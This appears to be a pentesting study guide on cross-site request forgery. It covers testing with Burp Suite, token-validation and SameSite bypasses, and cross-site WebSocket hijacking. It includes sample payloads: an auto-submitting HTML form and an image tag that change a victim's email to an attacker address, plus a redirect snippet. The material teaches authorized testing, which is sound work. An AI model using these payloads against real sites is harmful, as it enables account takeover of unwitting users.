- Perform the action using an authorized test account.
- Capture the legitimate HTTP request using Burp Suite Proxy.
- Inspect the HTTP method, endpoint, parameters and authentication mechanism.
- Look for CSRF tokens, existing-password requirements and other unpredictable parameters.
- Inspect cookie attributes, especially SameSite.
- Check whether Origin or Referer validation is implemented.
- Construct a cross-site HTML form that reproduces the legitimate request.
- Test it in a browser authenticated to the target application.
- Verify whether the browser sends the request, includes the required credentials and whether the server performs the action.
A request appearing in Burp is not sufficient evidence. Confirm that the request was initiated cross-site and that the authenticated action actually succeeded.

**Basic CSRF PoC Structure**

A common way to construct a CSRF attack is through an automatically submitted HTML form.

<html><body>    <form action=https://target.com/email/change          method="POST">

<input type="hidden"               name="email"               value="attacker@example.com">

</form>

<script>        document.forms[0].submit();    </script></body></html>

Important elements:

- **action:** Specifies the vulnerable endpoint.
- **method:** Specifies the HTTP method.
- **Hidden input: **Supplies the required request parameter.
- **JavaScript:** Automatically submits the form.
The browser may automatically attach the victim's applicable session cookie.

**Burp Suite – CSRF PoC Generator**

Burp Suite Professional provides a CSRF PoC Generator.

Workflow:

- Capture the legitimate request.
- Right-click the request.

```sql
Select Engagement tools → Generate CSRF PoC.
```

- Review the generated HTML.
- Adjust options if necessary.
- Open the PoC in an authenticated browser.
- Verify whether the intended action occurs.
The generator creates the initial HTML but does not prove that the application is vulnerable. Actual browser behavior and server-side validation must still be tested.

Burp Community users can construct the HTML manually.

**Important Things to Remember**

- CSRF abuses an authenticated browser; it doesn't necessarily require stealing credentials.
- Cross-origin requests can be sent even when the response cannot be read by the initiating website.
- Not every POST request is vulnerable to CSRF.
- A valid session cookie alone does not prove exploitability.
- SameSite cookie restrictions can prevent cookies from being included in cross-site requests.
- Testing in Burp Repeater alone does not reproduce the browser's automatic credential behavior.
- Always verify the actual impact of the action.
- Use authorized test accounts and reversible changes during testing.
**Initial CSRF Defenses**

Common protections include:

- CSRF tokens: Unpredictable tokens validated by the server.
- SameSite cookies: Restrict when cookies are sent in cross-site contexts.
- Origin/Referer validation: Check the origin of incoming requests.
- Re-authentication: Require additional verification for sensitive actions.
These defenses must be implemented and validated correctly. Their detailed testing and limitations should be documented separately.

**CSRF – Exploit Delivery & Common Defenses**

**1. Delivering a CSRF Exploit**

An attacker must make the victim's browser execute the malicious request.

**Common delivery methods:**

- **External website:** Host a malicious HTML page and trick the victim into visiting it through email, social media or messaging links.
- **Existing website:** Place malicious HTML in user-generated content, such as comments, so visitors trigger the request.

```bash
GET-based CSRF:** If an application performs sensitive actions through GET requests, an attacker can trigger them using HTML elements.
```

Example:

<img src="https://target.com/email/change?email=attacker@example.com">

When the browser loads the image, it sends a GET request to the target.

**Pentesting approach:**

- Identify GET endpoints that modify application data.
- Check whether their parameters are predictable.
- Test whether the browser sends the authenticated session cookie.
- Verify whether the action actually occurs.
**Remember:** GET requests should not perform state-changing operations. An image element can trigger GET requests but cannot submit arbitrary POST requests or custom headers.

**2. Common CSRF Defenses**

**A. CSRF Tokens**

A CSRF token is a secret, unpredictable value generated by the application. The server checks this value before processing sensitive requests.

Example:

POST /email/change HTTP/1.1

email=test@example.com&csrf_token=VALID123

**What to investigate in Burp Suite:**

- Look for parameters such as csrf, csrf_token or _token.
- Remove the token and check whether the request is rejected.
- Replace it with an incorrect or random value.
- Test whether an old token is accepted.
- Check whether a token from another session works.
**Pentester tip:** Finding a token doesn't mean the application is secure. What matters is whether the server properly validates it and associates it with the correct user or session.

**B. SameSite Cookies**

SameSite controls when browsers send cookies with cross-site requests.


| Setting | Browser behavior |
| --- | --- |
| Strict | Generally blocks cookies in cross-site requests and navigations. |
| Lax | Allows certain top-level safe navigations, such as GET, but generally blocks cross-site POST forms and image requests. |
| None | Allows cookies in cross-site contexts; requires Secure. |

**What to investigate:**

- Capture the authentication response in Burp.
- Inspect the Set-Cookie header.
- Identify the SameSite setting.
- Determine the type of cross-site request being used.
- Check whether the browser actually includes the session cookie.
- Verify whether the application performs the action.
**Pentester tip:** Don't assume SameSite=Lax blocks every CSRF scenario. Cross-origin and cross-site are different concepts. Two subdomains can be cross-origin but still same-site.

**C. Referer-Based Validation**

The Referer header indicates the page from which a request originated.

Example:

Referer: https://attacker.com/malicious.html

An application may check whether the request originated from its own domain and reject external requests.

**What to investigate:**

- Send a request with a legitimate Referer.
- Test an external Referer.
- Remove the Referer header.
- Test misleading domain values.
**Important weakness:**

A poorly implemented check such as:

referer.startswith("https://target.com")

may incorrectly accept:

https://target.com.attacker.com/

The application must validate the actual hostname or origin, not just a string prefix.

Referer validation is generally less robust than properly implemented CSRF tokens.

**3. Practical Pentesting Takeaways**

When investigating a potentially vulnerable endpoint:

- Capture the legitimate request in Burp Proxy.
- Identify the sensitive action and its parameters.
- Check for CSRF tokens and other unpredictable values.
- Inspect the session cookie's SameSite attribute.
- Understand whether the request is cross-origin or cross-site.
- Investigate Origin/Referer validation.
- Construct a controlled CSRF PoC.
- Verify cookie transmission and server-side acceptance.
- Confirm whether the intended action succeeds.
- Assess the actual security impact.
**Remember:** A generated PoC or a request appearing in Burp does not prove CSRF. Successful exploitation requires demonstrating that an attacker-controlled cross-site action can trigger an authenticated operation without the victim's intentional authorization.

**4. XSS vs CSRF**

- **XSS:** Attacker-controlled JavaScript executes in the vulnerable website's origin.
- **CSRF:** An attacker tricks the victim's browser into sending an unwanted authenticated request.
XSS can sometimes bypass CSRF protections because scripts executing in the application's origin may be able to access CSRF tokens and perform authenticated actions.

**Bypassing CSRF Token Validation**

**1. How CSRF Tokens Work**

A CSRF token is a unique, secret and unpredictable value generated by the application. The client must include it when submitting sensitive requests.

The server validates the token before performing the requested action.

Example:

POST /email/change HTTP/1.1Cookie: session=abc123csrf=VALID123&email=test@example.com

A properly implemented token must be unpredictable, validated by the server and appropriately associated with the user's session.

Tokens can be transmitted through hidden form parameters or HTTP headers.

**2. Common CSRF Token Validation Bypasses**

**A. Validation Depends on HTTP Method**

**Problem:** The application validates CSRF tokens for POST requests but skips validation for GET requests.

**Testing approach:**

- Capture a legitimate POST request.
- Change POST to GET.
- Move the body parameters into the URL.
- Remove the CSRF token if it isn't required.
- Check whether the sensitive action succeeds.
**Remember:** Investigate whether the same endpoint accepts alternative HTTP methods without enforcing token validation.

**B. Validation Depends on Token Presence**

**Problem:** The application validates the token only when the parameter is present. If the entire parameter is missing, validation is skipped.

**Testing approach:**

Test these three conditions separately:

- Valid token.
- Invalid token.
- Completely missing token parameter.
If the application accepts a request without the token, its validation may be improperly implemented.

**Important:** Removing the entire parameter is different from sending an empty or invalid token.

**C. Token Not Tied to User Session**

**Problem****:** The application accepts any token from a global pool of valid tokens instead of checking whether it belongs to the current user's session.

**Testing approach:**

- Log into Account A and obtain its CSRF token.
- Log into Account B using a separate session.
- Submit a request using Account B's session and Account A's token.
- Check whether the server accepts the request.
**Pentester tip:** A token can be random and unpredictable but still insecure if it isn't associated with the correct user session.

**D. Token Tied to a Non-Session Cookie**

**Problem****:** The application associates the CSRF token with a separate cookie instead of the authentication session cookie.

Example:

Cookie: session=SESSION123; csrfKey=COOKIE456csrf=COOKIE456&email=test@example.com

The application validates the request token against csrfKey, without properly associating it with the authenticated session.

**Potential exploitation:**

- Obtain a valid token and associated cookie using your own account.

```bash
Find a way to set that cookie in the victim's browser.
```

- Supply the corresponding token in the malicious request.
- Check whether the victim's authenticated session accepts the request.
**What to investigate:**

- Cookie-setting functionality.
- Cookie domain and path attributes.
- Insecure or controllable subdomains.
- Other applications sharing the same parent domain.
**Important:** A cookie-setting weakness is required. Look beyond the vulnerable application because another application on a related subdomain may be able to influence cookies sent to the target.

**E. Token Duplicated in a Cookie (Double-Submit Cookie)**

**Problem****:** The application places the same CSRF token in a cookie and a request parameter, then simply compares the two values.

Example:

Cookie: session=SESSION123; csrf=TOKEN123csrf=TOKEN123&email=test@example.com

If both values match, the application accepts the request.

**Potential bypass:**

If the application doesn't verify the token's authenticity or bind it securely to the session, an attacker may:

- Generate their own token.

```bash
Find a way to inject the corresponding cookie into the victim's browser.
```

- Supply the same value in the request parameter.
- Trigger the authenticated action.
**What to investigate:**

- Does the token appear in both the cookie and request?
- Does the server simply compare the two values?
- Can the CSRF cookie be influenced through another endpoint or subdomain?
- Does the implementation provide cryptographic integrity or session binding?
**Remember:** Double-submit cookies aren't inherently vulnerable. Properly signed or session-bound implementations can prevent cookie-injection attacks.

**3. Practical CSRF Token Testing Methodology**

When you encounter a CSRF-protected sensitive endpoint:

- Capture a legitimate request and establish a working baseline.
- Identify the token's location (parameter or header).
- Test with an invalid token.
- Remove the entire token parameter.
- Try alternative HTTP methods.
- Use a token from another authenticated session.
- Inspect cookies associated with CSRF validation.
- Investigate whether those cookies can be influenced.
- Check whether the token is duplicated between a cookie and request parameter.
- Verify whether the modified request performs the intended action.
**Troubleshooting****:** If a test fails, check whether the request was actually sent, whether the session cookie was included, whether another protection blocked it, and whether the server rejected the token or the application rejected the action for another reason.

**Important:** Change one condition at a time. Compare each modified request with the original so you can identify exactly which validation mechanism is working or failing.

**4. Key Takeaways**

- Never assume that the presence of a CSRF token means the application is secure.
- Test missing tokens, invalid tokens and alternative HTTP methods.
- Check whether tokens are associated with the correct user session.
- Inspect the relationship between CSRF tokens and cookies.
- Investigate cookie-setting weaknesses, including those on related subdomains.
- Understand the difference between non-session cookie binding and double-submit cookies.
- Always verify successful state changes before reporting a bypass.
**Bypassing SameSite Cookie Restrictions**

**1. Site vs Origin**

**Site:** Determined by the scheme (HTTP/HTTPS) and registrable domain (eTLD+1).

**Origin:** Determined by scheme, hostname and port.


| From | To | Same-site? | Same-origin? |
| --- | --- | --- | --- |
| https://example.com | https://example.com | Yes | Yes |
| https://app.example.com | https://admin.example.com | Yes | No |
| https://example.com | https://example.com:8080 | Yes | No |
| http://example.com | https://example.com | No | No |
| https://example.com | https://attacker.com | No | No |

**Important:** Different subdomains can be cross-origin but still same-site. SameSite considers the scheme and registrable domain, not the complete hostname and port.

This means an XSS vulnerability on a sibling subdomain may allow requests to another subdomain without SameSite blocking its cookies.

**2. SameSite Cookie Settings**

SameSite controls when browsers include cookies in cross-site requests.


| Setting | Behavior |
| --- | --- |
| Strict | Cookies are generally excluded from cross-site requests and navigations. |
| Lax | Cookies are allowed in certain top-level cross-site navigations using safe methods such as GET. |
| None | Allows cookies in cross-site contexts; requires Secure. |

Example:

Set-Cookie: session=abc123; SameSite=Lax; Secure

**Important points:**

- Lax generally blocks cross-site POST forms, images and iframe requests.
- Lax allows certain top-level GET navigations.
- Strict provides stronger cross-site restrictions but doesn't prevent same-site attacks.
- Chrome applies Lax-by-default behavior when SameSite is not explicitly specified.
- SameSite=None requires the Secure attribute.
**3. Common SameSite Bypasses**

**A. Bypassing Lax Using GET Requests**

**Problem:** An application accepts GET requests for sensitive functionality even though its legitimate form uses POST.

A cross-site top-level GET navigation can include the victim's Lax session cookie.

Example:

document.location ='https://target.com/account/change?email=attacker@example.com';

**Testing methodology:**

- Capture a sensitive POST request in Burp.
- Change POST to GET.
- Move the body parameters into the URL.
- Remove the CSRF token if the alternative request doesn't require it.
- Check whether the server accepts the GET request.
- Test through a top-level browser navigation.
- Verify whether the Lax cookie is included and the action succeeds.
**Additional technique – HTTP method override:**

Some frameworks allow HTTP methods to be overridden using parameters such as:

<input type="hidden" name="_method" value="POST">

The browser sends a GET request, but the framework interprets it as POST.

Investigate method-override functionality when a direct GET request is rejected.

**B. Bypassing Strict Using On-Site Gadgets**

**Problem:** An application contains a client-side redirect or another feature that triggers a secondary request within the same site.

Example:

window.location = "/account/change-email";

If an attacker can control the destination of a client-side redirect on the target website, they may use it to trigger a sensitive same-site request.

**Why it works****:** The browser treats the JavaScript-triggered secondary navigation as a new request. The resulting same-site request can include Strict cookies.

**Testing methodology:**

- Look for open redirects and client-side redirect functionality.
- Identify URL parameters that control navigation.
- Check whether JavaScript performs the redirect.
- Determine whether you can trigger a secondary request to a sensitive endpoint.
- Verify whether the Strict cookie is included.
**Important distinction:**

- Client-side redirect: Can create a secondary request treated as same-site.
- Server-side redirect (HTTP 302): Retains the cross-site navigation context, so the equivalent Strict-cookie bypass generally doesn't work.
**C. Bypassing SameSite Through Vulnerable Sibling Domains**

**Problem****:** An application uses SameSite cookies, but another subdomain belonging to the same site contains a vulnerability.

Example:

https://secure.example.com

https://blog.example.com

If blog.example.com has an XSS vulnerability, attacker-controlled JavaScript may send requests to secure.example.com.

Although the request is cross-origin, it is same-site. Therefore, SameSite restrictions generally won't block the applicable cookies.

**Testing methodology:**

- Identify related subdomains.
- Investigate staging, development, blog and other sibling applications.
- Look for XSS and other vulnerabilities that allow arbitrary requests.
- Determine whether those vulnerabilities can target sensitive functionality on another subdomain.
- Verify cookie transmission and the resulting action.
**Pentester tip:** Don't restrict your assessment to the main application. A vulnerability on a sibling subdomain can undermine SameSite protections across the entire site.

**D. Cross-Site WebSocket Hijacking (CSWSH)**

CSWSH is essentially CSRF targeting a WebSocket handshake.

Browsers may automatically attach applicable authentication cookies when establishing WebSocket connections.

If the application fails to validate the WebSocket handshake's Origin properly, an attacker-controlled website may establish an authenticated connection.

**What to investigate:**

- WebSocket handshake requests.
- Automatic cookie transmission.
- Origin validation.
- Whether an untrusted origin can establish an authenticated connection.
**4. Practical SameSite Testing Methodology**

When a CSRF attack appears blocked by SameSite:

- Capture the authentication response and inspect the session cookie.
- Identify whether it uses Strict, Lax or None.
- Understand whether the attack generates a top-level navigation or background request.
- Check whether the sensitive action accepts GET.
- Investigate HTTP method override functionality.
- Look for client-side redirects and on-site gadgets.
- Map sibling domains and investigate their vulnerabilities.
- Check WebSocket functionality and Origin validation where applicable.
- Test in an actual authenticated browser.
- Verify cookie transmission and successful execution of the action.
**Troubleshooting****:** If the attack fails, check the request method, navigation context, scheme, domain relationship, cookie attributes and whether another security control is blocking the request.

**5. Important Takeaways**

- SameSite and Same-Origin are different security concepts.
- Cross-origin requests can still be same-site.
- Lax cookies may be included in cross-site top-level GET navigations.
- Investigate GET requests and HTTP method override functionality.
- Client-side redirects can create opportunities to bypass Strict restrictions.
- Vulnerable sibling domains can undermine SameSite protection.
- Don't ignore WebSocket handshakes during security testing.
- Always verify actual browser cookie behavior rather than relying only on Burp Repeater.